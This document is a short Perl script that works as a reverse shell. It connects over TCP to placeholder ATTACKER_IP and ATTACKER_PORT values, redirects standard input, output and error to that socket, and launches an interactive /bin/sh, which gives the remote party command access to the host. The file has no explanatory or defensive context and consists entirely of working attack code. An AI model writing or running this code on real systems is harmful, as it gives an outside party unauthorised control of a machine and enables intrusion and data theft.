#!/usr/bin/perl

use strict;
use Socket;

my $ip = 'ATTACKER_IP';
my $port = 'ATTACKER_PORT';

socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCKET, sockaddr_in($port, inet_aton($ip)));

open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");

system("/bin/sh -i");

close(SOCKET);
